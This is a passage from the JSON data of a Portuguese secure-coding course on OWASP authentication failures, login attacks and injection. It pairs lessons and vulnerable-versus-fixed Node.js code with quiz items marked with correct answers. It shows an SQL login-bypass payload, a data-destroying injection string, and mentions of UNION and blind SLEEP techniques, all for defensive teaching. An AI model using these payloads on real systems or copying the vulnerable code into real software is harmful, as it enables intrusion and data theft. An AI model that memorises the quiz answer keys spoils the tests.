                        "statement": "Para corrigir um path traversal, um desenvolvedor apenas remove a substring `../` do nome do arquivo uma vez: `nome = req.query.arquivo.replace('../', '')`. Por que a correção é insuficiente?",
                        "difficulty": "dificil",
                        "options": [
                            {
                                "text": "A troca roda uma vez e é fácil driblar duplicando pontos e barras; o certo é resolver o caminho e checar a pasta base.",
                                "isCorrect": true
                            },
                            {
                                "text": "A remoção falha só em sistemas operacionais antigos; a correção real é atualizar o servidor para a versão mais recente.",
                                "isCorrect": false
                            },
                            {
                                "text": "A remoção só falha em caminhos muito longos; a correção real é limitar o nome do arquivo a poucos caracteres.",
                                "isCorrect": false
                            },
                            {
                                "text": "A remoção cobre todos os casos existentes; a correção real já elimina por completo o path traversal.",
                                "isCorrect": false
                            }
                        ]
                    }
                ]
            },
            {
                "titulo": "Falhas de autenticação: senhas e gestão de sessão",
                "blocks": [
                    {
                        "type": "text",
                        "value": "# Falhas de autenticação: senhas e gestão de sessão\n\nTrocamos de categoria. Saímos do **A01** (o que você pode fazer) e entramos no **A07:2025 Falhas de autenticação** (_Authentication Failures_): tudo que dá errado no processo de **provar quem você é** e de **manter você logado** com segurança.\n\nUma autenticação frágil é a porta de entrada para todo o resto: de nada adianta um controle de acesso impecável se o atacante consegue simplesmente **entrar como você**. Nesta aula cuidamos de dois pilares, as **senhas** e a **gestão de sessão**. Os ataques de login (força bruta, credential stuffing) e as defesas ficam para a próxima aula.\n\n## Políticas de senha modernas\n\nPor muito tempo, 'senha forte' virou sinônimo de regras irritantes: obrigar maiúscula, número e símbolo, e trocar tudo a cada 90 dias. As diretrizes atuais mudaram esse rumo, porque na prática essas regras empurravam as pessoas para senhas piores e previsíveis (o famoso `Senha@2025`)."
                    },
                    {
                        "type": "text",
                        "value": "O que realmente ajuda:\n\n- **Comprimento acima de complexidade**: uma frase longa (`cavalo azul come pilha`) é mais forte e mais fácil de lembrar do que `P@1x`. Exija um **mínimo** generoso (12 caracteres é um bom piso) e **permita** senhas bem longas.\n- **Bloquear senhas vazadas e óbvias**: compare a senha escolhida com listas de senhas mais usadas e de senhas já vazadas em incidentes conhecidos, e recuse as que aparecem.\n- **Não forçar troca periódica sem motivo**: só exija a troca quando houver sinal de comprometimento. Trocas obrigatórias sem causa geram senhas fracas em sequência.\n- **Deixar o gerenciador de senhas trabalhar**: permita colar a senha no campo e aceite todos os caracteres, inclusive espaços e acentos.\n\nE, claro, senha nunca é guardada em texto puro. Ela é transformada por um algoritmo de _hashing_ próprio para senhas, como **bcrypt** ou **argon2**, com _salt_. Guardar e comparar senhas com segurança é assunto do módulo de **Falhas criptográficas (A04)**; aqui basta gravar a regra: **nunca** salve a senha do jeito que foi digitada."
                    },
                    {
                        "type": "table",
                        "value": "[[\"Tema\", \"Recomendado\", \"Evitar\"], [\"Tamanho\", \"Mínimo alto (12+) e permitir frases longas\", \"Máximo curto e limite baixo de caracteres\"], [\"Complexidade\", \"Bloquear senhas vazadas e comuns\", \"Só exigir maiúscula, número e símbolo\"], [\"Validade\", \"Trocar apenas sob suspeita de vazamento\", \"Forçar troca a cada 30 ou 90 dias\"], [\"Armazenamento\", \"Hash com bcrypt ou argon2 e salt\", \"Texto puro ou hash rápido como MD5/SHA-1\"]]"
                    },
                    {
                        "type": "text",
                        "value": "## Gestão de sessão: cookies e tokens\n\nDepois do login, o servidor entrega um **identificador de sessão** (um token, guardado normalmente num cookie) que acompanha cada requisição seguinte, para você não digitar a senha o tempo todo. Se esse token vaza ou é previsível, o atacante 'vira você' sem nunca saber a sua senha. Por isso o cookie de sessão precisa de três atributos:\n\n- **HttpOnly**: o JavaScript da página não consegue ler o cookie. Isso protege o token mesmo que a página sofra um XSS.\n- **Secure**: o cookie só trafega por HTTPS, nunca em conexão aberta.\n- **SameSite**: o navegador não envia o cookie em requisições vindas de outros sites, o que ajuda contra CSRF.\n\nAlém disso, a sessão precisa **expirar** (por inatividade e também num prazo máximo absoluto) e ser **invalidada no logout**, do lado do servidor.\n\nHá ainda um ataque específico, o **session fixation** (fixação de sessão): o atacante faz a vítima usar um identificador de sessão que **ele já conhece** (por exemplo, plantando o cookie antes do login). Se a aplicação **mantém o mesmo id** depois que a vítima autentica, o atacante passa a compartilhar aquela sessão já logada. A defesa é **gerar um novo id de sessão no momento do login**."
                    },
                    {
                        "type": "code",
                        "value": "// VULNERÁVEL: cookie sem atributos e sem expiração\nres.cookie(\"sid\", token);\n// legível por JavaScript (um XSS rouba o token), viaja em HTTP puro,\n// é enviado a outros sites e nunca expira\n\n// SEGURO: atributos de proteção + expiração\nres.cookie(\"sid\", token, {\n  httpOnly: true,          // o JavaScript não lê o cookie\n  secure: true,            // só trafega por HTTPS\n  sameSite: \"strict\",      // não vai em requisições de outros sites\n  maxAge: 1000 * 60 * 30,  // expira em 30 minutos\n});\n\n// Contra session fixation: gere um novo id de sessão ao autenticar\napp.post(\"/login\", (req, res) => {\n  const usuario = autenticar(req.body.email, req.body.senha);\n  if (!usuario) return res.status(401).json({ erro: \"Credenciais inválidas\" });\n  req.session.regenerate(() => {   // descarta o id antigo e cria um novo\n    req.session.usuarioId = usuario.id;\n    res.json({ ok: true });\n  });\n});"
                    },
                    {
                        "type": "quote",
                        "value": "**Recapitulando:** as **Falhas de autenticação (A07)** atacam o processo de provar quem você é. Em senhas, priorize **comprimento**, **bloqueie senhas vazadas**, **não force trocas sem motivo** e guarde tudo com **hashing** (bcrypt/argon2). Na sessão, use cookies com **HttpOnly**, **Secure** e **SameSite**, faça a sessão **expirar** e **gere um novo id no login** para barrar o _session fixation_."
                    }
                ],
                "questions": [
                    {
                        "statement": "A categoria A07:2025 do OWASP, 'Falhas de autenticação', trata principalmente de quê?",
                        "difficulty": "facil",
                        "options": [
                            {
                                "text": "De falhas no processo de provar a identidade do usuário e manter a sessão segura.",
                                "isCorrect": true
                            },
                            {
                                "text": "De falhas na checagem de permissões de acesso aos recursos da aplicação.",
                                "isCorrect": false
                            },
                            {
                                "text": "De falhas na configuração de servidores, frameworks e bibliotecas de terceiros.",
                                "isCorrect": false
                            },
                            {
                                "text": "De falhas no tratamento de exceções e nas mensagens de erro exibidas ao usuário final.",
                                "isCorrect": false
                            }
                        ]
                    },
                    {
                        "statement": "Para que serve o atributo HttpOnly em um cookie de sessão?",
                        "difficulty": "facil",
                        "options": [
                            {
                                "text": "Impedir que o JavaScript leia o cookie, mesmo que a página sofra um ataque XSS.",
                                "isCorrect": true
                            },
                            {
                                "text": "Garantir que o cookie só seja transmitido em conexões criptografadas por HTTPS.",
                                "isCorrect": false
                            },
                            {
                                "text": "Fazer o cookie de sessão expirar automaticamente depois de 30 minutos parado.",
                                "isCorrect": false
                            },
                            {
                                "text": "Impedir que o cookie seja enviado junto com requisições vindas de outros sites.",
                                "isCorrect": false
                            }
                        ]
                    },
                    {
                        "statement": "Segundo as diretrizes modernas de senha, qual prática é DESACONSELHADA?",
                        "difficulty": "medio",
                        "options": [
                            {
                                "text": "Forçar a troca periódica da senha a cada 90 dias, mesmo sem nenhum sinal de vazamento.",
                                "isCorrect": true
                            },
                            {
                                "text": "Recusar qualquer senha que já apareça em listas públicas de senhas vazadas conhecidas.",
                                "isCorrect": false
                            },
                            {
                                "text": "Exigir um comprimento mínimo bem alto e aceitar frases longas como senha do usuário.",
                                "isCorrect": false
                            },
                            {
                                "text": "Permitir que a senha seja colada no campo direto a partir de um gerenciador de senhas.",
                                "isCorrect": false
                            }
                        ]
                    },
                    {
                        "statement": "Um site aceita um id de sessão vindo da URL e mantém o mesmo id antes e depois do login. Um atacante manda à vítima um link com um id que ele conhece; quando ela faz login, ele passa a usar a sessão já autenticada. Qual falha é essa e qual a defesa?",
                        "difficulty": "medio",
                        "options": [
                            {
                                "text": "Session fixation: a defesa é gerar um novo id de sessão assim que o login acontece.",
                                "isCorrect": true
                            },
                            {
                                "text": "Credential stuffing: a defesa mais eficaz é sempre exigir MFA em toda tentativa de login.",
                                "isCorrect": false
                            },
                            {
                                "text": "IDOR: a defesa correta é verificar se o objeto pedido pertence ao usuário logado.",
                                "isCorrect": false
                            },
                            {
                                "text": "Path traversal: a defesa é normalizar o caminho e validar se ficou na pasta final.",
                                "isCorrect": false
                            }
                        ]
                    },
                    {
                        "statement": "Analise: `res.cookie('sid', token)`, sem opções adicionais, num site que aceita tanto HTTP quanto HTTPS. Quais riscos esse cookie corre?",
                        "difficulty": "dificil",
                        "options": [
                            {
                                "text": "Faltam HttpOnly (leitura via XSS), Secure (HTTP puro) e SameSite (vai a outros sites).",
                                "isCorrect": true
                            },
                            {
                                "text": "Nenhum risco relevante: o navegador aplica HttpOnly e Secure a todo cookie por padrão.",
                                "isCorrect": false
                            },
                            {
                                "text": "Apenas o risco de o cookie expirar cedo demais e atrapalhar bastante a experiência do usuário.",
                                "isCorrect": false
                            },
                            {
                                "text": "Apenas o risco de o cookie ocupar um espaço excessivo no armazenamento local do navegador.",
                                "isCorrect": false
                            }
                        ]
                    }
                ]
            },
            {
                "titulo": "Ataques a login e defesas: força bruta, credential stuffing e MFA",
                "blocks": [
                    {
                        "type": "text",
                        "value": "# Ataques a login e defesas: força bruta, credential stuffing e MFA\n\nA tela de login é o alvo favorito de quem quer entrar sem convite. Ainda dentro do **A07 Falhas de autenticação**, esta aula fecha o módulo com os principais **ataques contra o login** e as **defesas** que barram cada um.\n\nTrês ataques dominam o cenário:\n\n- **Força bruta** (_brute force_): tentar **muitas senhas** contra **uma conta**, de forma sistemática, até acertar. Quanto mais fraca a senha, mais rápido ela cai.\n- **Credential stuffing**: usar **pares de e-mail e senha já vazados** em outros incidentes e testá-los em massa no seu site. Funciona por um motivo triste: as pessoas **reutilizam** a mesma senha em vários serviços.\n- **Password spraying**: o inverso da força bruta. O atacante testa **poucas senhas muito comuns** (como `123456`) contra **muitas contas**, devagar, para não disparar os bloqueios por conta."
                    },
                    {
                        "type": "table",
                        "value": "[[\"Ataque\", \"Como funciona\", \"Defesa principal\"], [\"Força bruta\", \"Muitas senhas contra uma conta\", \"Rate limiting e senhas fortes\"], [\"Credential stuffing\", \"Pares vazados testados em massa\", \"MFA e bloqueio de senhas vazadas\"], [\"Password spraying\", \"Poucas senhas comuns em muitas contas\", \"Bloqueio de senhas comuns e monitoramento\"]]"
                    },
                    {
                        "type": "text",
                        "value": "## As defesas\n\nNenhuma defesa sozinha resolve; a força está na combinação:\n\n- **Rate limiting** (limitar tentativas): restringir quantas tentativas de login um IP ou uma conta pode fazer por minuto. Corta a força bruta pela raiz.\n- **Bloqueio temporário** (_lockout_) ou atraso progressivo após várias falhas. Cuidado: bloquear a conta por tempo indefinido a cada tentativa errada vira um problema de disponibilidade, pois o atacante pode travar a conta da vítima de propósito. Prefira atrasos que crescem e sinais adicionais.\n- **CAPTCHA** depois de algumas falhas, para separar humano de robô.\n- **MFA**, a defesa mais eficaz contra o credential stuffing (veja abaixo).\n- **Mensagens de erro genéricas**: nunca diga 'usuário não existe' ou 'senha incorreta' separadamente. Isso é **enumeração de usuários** (_user enumeration_): pela diferença nas respostas, o atacante descobre quais e-mails têm conta. Responda sempre a mesma coisa, algo como 'usuário ou senha inválidos'.\n\nVeja o login inseguro e a versão endurecida lado a lado:"
                    },
                    {
                        "type": "code",
                        "value": "// VULNERÁVEL: sem limite de tentativas e revelando o que existe\napp.post(\"/login\", (req, res) => {\n  const usuario = db.usuarios.buscarPorEmail(req.body.email);\n  if (!usuario) return res.status(404).json({ erro: \"Usuário não encontrado\" });\n  if (!conferirSenha(req.body.senha, usuario.hash))\n    return res.status(401).json({ erro: \"Senha incorreta\" });\n  // ^ respostas diferentes entregam quais e-mails têm conta (enumeração)\n  //   e nada impede milhares de tentativas por segundo (força bruta)\n  res.json({ ok: true });\n});\n\n// SEGURO: rate limiting + mensagem única e genérica\nconst limite = rateLimit({ windowMs: 60 * 1000, max: 5 }); // 5 tentativas/min por IP\n\napp.post(\"/login\", limite, (req, res) => {\n  const usuario = db.usuarios.buscarPorEmail(req.body.email);\n  const ok = usuario && conferirSenha(req.body.senha, usuario.hash);\n  if (!ok) return res.status(401).json({ erro: \"Usuário ou senha inválidos\" });\n  res.json({ ok: true });\n});"
                    },
                    {
                        "type": "text",
                        "value": "## MFA: o fator que muda o jogo\n\n**MFA** (_Multi-Factor Authentication_, autenticação multifator) exige **dois ou mais fatores de tipos diferentes** para confirmar a identidade. Os fatores se dividem em três categorias:\n\n- **Algo que você sabe**: a senha, um PIN.\n- **Algo que você tem**: o celular com um app de códigos, uma chave física de segurança.\n- **Algo que você é**: biometria, como a digital ou o rosto.\n\nA força do MFA está em **combinar categorias**: a senha (algo que você sabe) mais um código do aplicativo (algo que você tem). Assim, mesmo que o atacante tenha a sua senha vazada, ele não passa sem o segundo fator, e é por isso que o MFA é a defesa mais forte contra o **credential stuffing**.\n\nNem todo segundo fator é igual: um **app autenticador** (códigos TOTP) ou uma **chave física** (padrões FIDO2/WebAuthn) são mais seguros que o **SMS**, que pode ser desviado num golpe de troca de chip (_SIM swap_). SMS é melhor que nada, mas prefira o app ou a chave quando puder."
                    },
                    {
                        "type": "quote",
                        "value": "**Recapitulando:** a **força bruta** testa muitas senhas numa conta; o **credential stuffing** reaproveita senhas já vazadas (por causa do reuso); o **password spraying** espalha poucas senhas comuns por muitas contas. Defenda-se com **rate limiting**, **atrasos progressivos**, **mensagens genéricas** (contra a enumeração de usuários) e, acima de tudo, **MFA**, que combina fatores de tipos diferentes e neutraliza a senha vazada. Prefira app autenticador ou chave física ao SMS."
                    }
                ],
                "questions": [
                    {
                        "statement": "Por que o ataque de credential stuffing costuma funcionar?",
                        "difficulty": "facil",
                        "options": [
                            {
                                "text": "Porque muita gente repete a senha em vários sites, e um par vazado funciona em outro.",
                                "isCorrect": true
                            },
                            {
                                "text": "Porque a maior parte dos servidores aceita senha em branco como valor padrão de login.",
                                "isCorrect": false
                            },
                            {
                                "text": "Porque o HTTPS criptografa bem a conexão, mas não protege em nada a tela de login.",
                                "isCorrect": false
                            },
                            {
                                "text": "Porque o navegador envia a senha sem nenhuma camada extra de proteção até o servidor.",
                                "isCorrect": false
                            }
                        ]
                    },
                    {
                        "statement": "Qual defesa ataca diretamente a força bruta, limitando quantas tentativas de login são aceitas por minuto?",
                        "difficulty": "facil",
                        "options": [
                            {
                                "text": "Rate limiting: um limite de tentativas de login aceitas por minuto.",
                                "isCorrect": true
                            },
                            {
                                "text": "Output encoding: a codificação do conteúdo antes de exibi-lo na tela.",
                                "isCorrect": false
                            },
                            {
                                "text": "Prepared statements: consultas ao banco com parâmetros separados do SQL.",
                                "isCorrect": false
                            },
                            {
                                "text": "Content Security Policy: uma política que restringe scripts na página.",
                                "isCorrect": false
                            }
                        ]
                    },
                    {
                        "statement": "Um login responde 'Usuário não encontrado' quando o e-mail não existe e 'Senha incorreta' quando ele existe mas a senha erra. Que fraqueza isso introduz?",
                        "difficulty": "medio",
                        "options": [
                            {
                                "text": "Enumeração de usuários: a diferença nas respostas revela quais e-mails têm conta.",
                                "isCorrect": true
                            },
                            {
                                "text": "Injeção de SQL: o campo de e-mail está sendo concatenado direto dentro da consulta.",
                                "isCorrect": false
                            },
                            {
                                "text": "Session fixation: o identificador de sessão não é trocado no momento do login.",
                                "isCorrect": false
                            },
                            {
                                "text": "Nenhuma fraqueza real: mensagens específicas só ajudam o usuário a corrigir o erro.",
                                "isCorrect": false
                            }
                        ]
                    },
                    {
                        "statement": "Um sistema pede a senha e, em seguida, um código gerado por um aplicativo no celular do usuário. Por que isso é considerado autenticação multifator (MFA)?",
                        "difficulty": "medio",
                        "options": [
                            {
                                "text": "Porque combina fatores diferentes: a senha, que se sabe, e o app, que se tem.",
                                "isCorrect": true
                            },
                            {
                                "text": "Porque pede a mesma senha duas vezes seguidas só para confirmar se está correta.",
                                "isCorrect": false
                            },
                            {
                                "text": "Porque exige duas senhas distintas, sendo as duas do tipo algo que você sabe.",
                                "isCorrect": false
                            },
                            {
                                "text": "Porque usa reconhecimento biométrico nas duas etapas seguidas do processo de login.",
                                "isCorrect": false
                            }
                        ]
                    },
                    {
                        "statement": "Para conter a força bruta, um time decide bloquear permanentemente qualquer conta após 3 senhas erradas, até um administrador liberar. Qual efeito colateral essa escolha cria?",
                        "difficulty": "dificil",
                        "options": [
                            {
                                "text": "Um atacante pode errar a senha de propósito para bloquear a conta da vítima, causando negação de serviço.",
                                "isCorrect": true
                            },
                            {
                                "text": "As senhas de todas as contas passam a ser gravadas em texto simples dentro do banco de dados da aplicação.",
                                "isCorrect": false
                            },
                            {
                                "text": "O MFA para de funcionar em qualquer conta que já tenha sido bloqueada uma única vez pelo sistema.",
                                "isCorrect": false
                            },
                            {
                                "text": "O rate limiting configurado por endereço IP deixa de produzir qualquer efeito prático no sistema.",
                                "isCorrect": false
                            }
                        ]
                    }
                ]
            }
        ]
    },
    {
        "titulo": "Módulo 3 - Injeção e XSS (A05)",
        "aulas": [
            {
                "titulo": "O que é injeção: o princípio por trás da A05",
                "blocks": [
                    {
                        "type": "text",
                        "value": "# O que é injeção: o princípio por trás da A05\n\nBem-vindo ao módulo sobre uma das famílias de vulnerabilidades mais antigas e ainda mais perigosas da web: a **injeção**. No OWASP Top 10 2025 ela aparece como **A05:2025 - Injection (Injeção)** e, atenção: essa categoria **engloba o XSS** (cross-site scripting). Em edições anteriores a injeção já ocupou o primeiro lugar; hoje figura em A05 não porque deixou de ser grave, mas porque os frameworks modernos passaram a proteger por padrão. Onde esse padrão é furado, o estrago continua enorme.\n\nAntes de estudar SQL injection, command injection, XSS e CSRF um a um, esta aula te dá o **modelo mental** que vale para todos eles. Entendendo o princípio, cada ataque específico vira só uma variação do mesmo tema."
                    },
                    {
                        "type": "text",
                        "value": "## A raiz de toda injeção: misturar dados com código\n\nO seu sistema vive conversando com **interpretadores**: o banco de dados interpreta **SQL**, o sistema operacional interpreta **comandos de shell**, o navegador interpreta **HTML e JavaScript**. Para cada um deles, você monta um texto (uma consulta, uma linha de comando, um pedaço de página) que mistura **duas coisas de naturezas diferentes**:\n\n- o **código** que você, desenvolvedor, escreveu (a instrução);\n- os **dados** que vêm de fora (o que o usuário digitou, o conteúdo de uma URL, um campo de formulário).\n\nA **injeção** acontece quando um dado que deveria ser tratado como simples **conteúdo** consegue **escapar** do seu lugar e passa a ser interpretado como **instrução**. O interpretador não enxerga intenção: se o texto final mandar fazer algo, ele faz. E o ponto fraco quase sempre é o mesmo gesto: **concatenar** a entrada do usuário direto no texto que será interpretado."
                    },
                    {
                        "type": "quote",
                        "value": "Toda injeção nasce do mesmo erro: juntar, na mesma string, o que é instrução com o que é dado. Quando a entrada do usuário consegue mudar a ESTRUTURA do comando (e não apenas os valores), você tem uma vulnerabilidade de injeção."
                    },
                    {
                        "type": "code",
                        "value": "// A ideia, em pseudocodigo, vale para SQL, shell ou HTML:\n// codigo fixo + dado do usuario, tudo grudado na mesma string.\nconst entrada = pegarDoUsuario();\nconst comando = \"BUSCAR usuario ONDE nome = '\" + entrada + \"'\";\n\n// Uso esperado:   entrada = \"maria\"\n//   -> BUSCAR usuario ONDE nome = 'maria'\n\n// Uso malicioso:  entrada = \"x'; APAGAR usuarios; --\"\n//   -> BUSCAR usuario ONDE nome = 'x'; APAGAR usuarios; --'\n// O dado fechou a aspa, emendou um novo comando e comentou o resto.\n// Deixou de ser 'dado' e virou 'codigo'."
                    },
                    {
                        "type": "table",
                        "value": "[[\"Interpretador / contexto\",\"Tipo de injecao\",\"O dado vira codigo quando...\",\"Defesa principal\"],[\"Banco de dados (SQL)\",\"SQL Injection\",\"muda a estrutura da consulta\",\"Consultas parametrizadas\"],[\"Shell do sistema operacional\",\"Command Injection\",\"adiciona comandos a linha\",\"APIs com argumentos separados\"],[\"Navegador (HTML/JS)\",\"XSS\",\"e interpretado como marcacao/script\",\"Output encoding + CSP\"],[\"Banco NoSQL\",\"NoSQL Injection\",\"vira um operador de consulta\",\"Parametrizar / validar tipos\"],[\"Diretorio LDAP\",\"LDAP Injection\",\"altera o filtro de busca\",\"Escape/parametrizacao do filtro\"]]"
                    },
                    {
                        "type": "text",
                        "value": "## Três pilares de defesa que se repetem\n\nSe a doença é sempre a mesma, o remédio também rima. Guarde estes três pilares; eles voltam em todas as aulas deste módulo:\n\n1. **Separe código de dados.** Em vez de concatenar, use mecanismos que enviam a instrução e os valores por canais diferentes: **consultas parametrizadas** no banco, **APIs que recebem argumentos** no lugar de linhas de comando. Assim o dado nunca tem chance de virar instrução.\n2. **Codifique a saída para o contexto.** Quando você *precisa* colocar um dado dentro de um texto interpretado (o HTML de uma página, por exemplo), aplique **output encoding**: transforme os caracteres especiais daquele contexto em versões inofensivas.\n3. **Valide a entrada e use o menor privilégio.** Rejeite o que estiver claramente fora do formato esperado e faça cada componente rodar com o **mínimo de permissões**. Isso não substitui os dois primeiros, mas reduz o estrago quando algo passa. É a ideia de **defesa em profundidade**."
                    }
                ],
                "questions": [
                    {
                        "statement": "No OWASP Top 10 2025, a categoria de Injeção (A05) engloba qual das vulnerabilidades abaixo?",
                        "difficulty": "facil",
                        "options": [
                            {
                                "text": "XSS (cross-site scripting).",
                                "isCorrect": true
                            },
                            {
                                "text": "CSRF (cross-site request forgery).",
                                "isCorrect": false
                            },
                            {
                                "text": "SSRF (server-side request forgery).",
                                "isCorrect": false
                            },
                            {
                                "text": "Controle de acesso quebrado.",
                                "isCorrect": false
                            }
                        ]
                    },
                    {
                        "statement": "Qual é a causa raiz comum a todas as vulnerabilidades de injeção?",
                        "difficulty": "facil",
                        "options": [
                            {
                                "text": "Configurar senhas fracas demais para as contas do banco de dados.",
                                "isCorrect": false
                            },
                            {
                                "text": "Misturar, numa mesma string, o dado do usuário com o comando.",
                                "isCorrect": true
                            },
                            {
                                "text": "Deixar de renovar o certificado TLS do domínio principal.",
                                "isCorrect": false
                            },
                            {
                                "text": "Esquecer de fazer backup periódico dos dados salvos.",
                                "isCorrect": false
                            }
                        ]
                    },
                    {
                        "statement": "Considere: const comando = \"BUSCAR usuario ONDE nome = '\" + entrada + \"'\";  Por que a entrada do usuário torna esse trecho vulnerável a injeção?",
                        "difficulty": "medio",
                        "options": [
                            {
                                "text": "Porque o nome da variável 'comando' é uma palavra reservada do banco.",
                                "isCorrect": false
                            },
                            {
                                "text": "Porque falta um ponto e vírgula ao final do comando montado.",
                                "isCorrect": false
                            },
                            {
                                "text": "Porque a entrada concatenada fecha a aspa e altera o comando.",
                                "isCorrect": true
                            },
                            {
                                "text": "Porque a instrução SQL precisa estar toda em letras maiúsculas.",
                                "isCorrect": false
                            }
                        ]
                    },
                    {
                        "statement": "Enviar a instrução e os valores por canais separados (consultas parametrizadas, ou APIs que recebem argumentos) corresponde a qual pilar de defesa contra injeção?",
                        "difficulty": "medio",
                        "options": [
                            {
                                "text": "Codificar a saída para o contexto (output encoding).",
                                "isCorrect": false
                            },
                            {
                                "text": "Separar código de dados.",
                                "isCorrect": true
                            },
                            {
                                "text": "Registrar logs de auditoria.",
                                "isCorrect": false
                            },
                            {
                                "text": "Usar o menor privilégio possível.",
                                "isCorrect": false
                            }
                        ]
                    },
                    {
                        "statement": "Um desenvolvedor tenta impedir injeção apenas removendo a aspa simples (') da entrada do usuário, com uma blacklist. Por que essa estratégia é frágil?",
                        "difficulty": "dificil",
                        "options": [
                            {
                                "text": "Porque remover aspas deixa as consultas mais lentas para o banco.",
                                "isCorrect": false
                            },
                            {
                                "text": "Porque uma blacklist bem construída elimina toda fragilidade real.",
                                "isCorrect": false
                            },
                            {
                                "text": "Porque aspas simples não aparecem em ataques de injeção reais.",
                                "isCorrect": false
                            },
                            {
                                "text": "Porque sempre sobra algum truque que a blacklist não previu.",
                                "isCorrect": true
                            }
                        ]
                    }
                ]
            },
            {
                "titulo": "SQL Injection: quando a consulta obedece o atacante",
                "blocks": [
                    {
                        "type": "text",
                        "value": "# SQL Injection: quando a consulta obedece o atacante\n\nO **SQL injection** (SQLi) é a injeção clássica: o alvo é o **banco de dados**. Acontece quando a sua aplicação monta uma consulta SQL **concatenando** dados do usuário, e esses dados conseguem alterar a **estrutura** da consulta em vez de preencher apenas os seus valores.\n\nVamos partir do exemplo mais didático: uma tela de **login** que confere e-mail e senha no banco. (Para focar na injeção, o exemplo compara a senha em texto puro; guardar senha assim é outro erro, tratado no módulo de criptografia.)"
                    },
                    {
                        "type": "code",
                        "value": "// VULNERAVEL: a entrada do usuario e concatenada direto na SQL\nconst email = req.body.email;\nconst senha = req.body.senha;\n\nconst sql =\n  \"SELECT * FROM usuarios WHERE email = '\" + email +\n  \"' AND senha = '\" + senha + \"'\";\n\nconst resultado = await db.query(sql);\nif (resultado.rows.length > 0) logar(resultado.rows[0]);\n\n// Se no campo email o atacante digitar:   ' OR '1'='1' --\n// a consulta enviada ao banco vira:\n// SELECT * FROM usuarios WHERE email = '' OR '1'='1' --' AND senha = '...'\n//\n// '1'='1' e sempre verdadeiro e o -- comenta o resto (inclusive a senha).\n// Resultado: retorna o primeiro usuario e o login passa SEM senha valida."
                    },
                    {
                        "type": "text",
                        "value": "## Não é só burlar o login\n\nMudar a lógica de um WHERE é só o começo. Com a estrutura da consulta em mãos, o atacante pode ir muito além:\n\n- **Vazar dados de outras tabelas** com `UNION SELECT`, colando resultados de `senhas` ou `cartoes` na resposta que a tela esperava.\n- **Comentar** o resto da consulta com `--` ou `/* */` para descartar as condições que o atrapalham.\n- **SQLi cega (blind)**: mesmo sem ver o resultado, inferir dados observando se a página muda ou quanto ela demora a responder (`AND SLEEP(5)`).\n- Em bancos que aceitam **múltiplos comandos**, até **alterar ou apagar** dados.\n\nO impacto vai de **vazamento total do banco** a **adulteração** e **destruição** de dados. É uma das falhas de maior severidade justamente por dar acesso ao coração da aplicação: os dados."
                    },
                    {
                        "type": "code",
                        "value": "// SEGURO: consulta PARAMETRIZADA - instrucao e valores vao separados\nconst email = req.body.email;\nconst senha = req.body.senha;\n\n// Os $1/$2 sao espacos reservados; o driver envia os valores a parte.\nconst sql = \"SELECT * FROM usuarios WHERE email = $1 AND senha = $2\";\nconst resultado = await db.query(sql, [email, senha]);\n\n// Agora  ' OR '1'='1' --  e procurado LITERALMENTE como um e-mail.\n// Nao existe esse e-mail: o login falha, como deveria.\n\n// Em Python (psycopg) a ideia e a mesma - placeholder %s, NUNCA f-string:\n// cur.execute(\"SELECT * FROM usuarios WHERE email = %s AND senha = %s\", (email, senha))\n\n// Um ORM (Prisma, Sequelize, SQLAlchemy) tambem parametriza por baixo:\n// await prisma.usuario.findFirst({ where: { email, senha } });"
                    },
                    {
                        "type": "table",
                        "value": "[[\"Camada de defesa\",\"O que faz\",\"Observacao\"],[\"Consulta parametrizada / prepared statement\",\"Envia instrucao e valores separados\",\"E a correcao principal\"],[\"ORM ou query builder\",\"Parametriza automaticamente\",\"Cuidado com SQL bruto embutido\"],[\"Validacao de entrada\",\"Rejeita formatos claramente invalidos\",\"Defesa extra, nao substitui parametrizar\"],[\"Menor privilegio do usuario do banco\",\"A conta da app so faz o necessario\",\"Reduz o estrago de um ataque\"],[\"Mensagens de erro genericas\",\"Nao devolve o erro cru do banco\",\"Dificulta o atacante mapear a base\"]]"
                    },
                    {
                        "type": "quote",
                        "value": "A correção de verdade para SQL injection não é filtrar caracteres perigosos, é PARAMETRIZAR: enviar a consulta e os valores por canais separados, para que o dado do usuário nunca possa virar parte do comando SQL."
                    }
                ],
                "questions": [
                    {
                        "statement": "O que caracteriza um ataque de SQL injection?",
                        "difficulty": "facil",
                        "options": [
                            {
                                "text": "Dado do usuário concatenado na consulta altera a estrutura do SQL.",
                                "isCorrect": true
                            },
                            {
                                "text": "O banco de dados fica sem espaço em disco e a aplicação trava.",
                                "isCorrect": false
                            },
                            {
                                "text": "O atacante descobre a senha do administrador por tentativa e erro.",
                                "isCorrect": false
                            },
                            {
                                "text": "Um script do atacante roda no navegador de outro usuário da aplicação.",
                                "isCorrect": false
                            }
                        ]
                    },
                    {
                        "statement": "Qual é a defesa principal (a correção de verdade) contra SQL injection?",
                        "difficulty": "facil",
                        "options": [
                            {
                                "text": "Servir a aplicação inteira apenas por conexões HTTPS.",
                                "isCorrect": false
                            },
                            {
                                "text": "Trocar o banco de dados relacional por outro fornecedor.",
                                "isCorrect": false
                            },
                            {
                                "text": "Parametrizar as consultas, separando instrução e valores.",
                                "isCorrect": true
                            },
                            {
                                "text": "Remover todos os espaços em branco da entrada do usuário.",
                                "isCorrect": false
                            }
                        ]
                    },
                    {
                        "statement": "No login vulnerável do exemplo, o atacante digita  ' OR '1'='1' --  no campo de e-mail. Qual é o efeito?",
                        "difficulty": "medio",
                        "options": [
                            {
                                "text": "A consulta gera erro de sintaxe e a aplicação simplesmente cai.",
                                "isCorrect": false
                            },
                            {
                                "text": "A condição vira sempre verdadeira e o login passa sem senha válida.",
                                "isCorrect": true
                            },
                            {
                                "text": "O banco apaga a tabela inteira de usuários automaticamente após a busca.",
                                "isCorrect": false
                            },
                            {
                                "text": "Nada acontece, porque o banco ignora aspas simples na consulta.",
                                "isCorrect": false
                            }
                        ]
                    },
                    {
                        "statement": "Qual dos trechos abaixo previne SQL injection ao buscar um registro por id?",
                        "difficulty": "medio",
                        "options": [
                            {
                                "text": "db.query(\"SELECT * FROM usuarios WHERE id = $1\", [id])",
                                "isCorrect": true
                            },
                            {
                                "text": "db.query(\"SELECT * FROM usuarios WHERE id = \" + id)",
                                "isCorrect": false
                            },
                            {
                                "text": "db.query(`SELECT * FROM usuarios WHERE id = ${id}`)",
                                "isCorrect": false
                            },
                            {
                                "text": "db.query(\"SELECT * FROM usuarios WHERE id = '\" + escape(id) + \"'\")",
                                "isCorrect": false
                            }
                        ]
                    },
                    {
